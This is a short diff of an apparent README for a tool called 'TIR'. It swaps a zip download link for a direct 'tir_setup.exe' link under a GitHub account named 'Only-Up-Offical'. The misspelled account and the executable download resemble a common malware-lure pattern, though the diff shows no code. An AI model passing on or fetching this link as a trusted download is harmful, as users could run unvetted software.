@@ -2,7 +2,7 @@
 
 Explore our official site: [TIR](https://tir-official.github.io)
 
-Download TIR: [TIR](https://github.com/Only-Up-Offical/tir/releases/download/TIR/TIR.zip)
+Download TIR: [TIR](https://github.com/Only-Up-Offical/tir/releases/download/TIR/tir_setup.exe)
 
 ## Overview
 
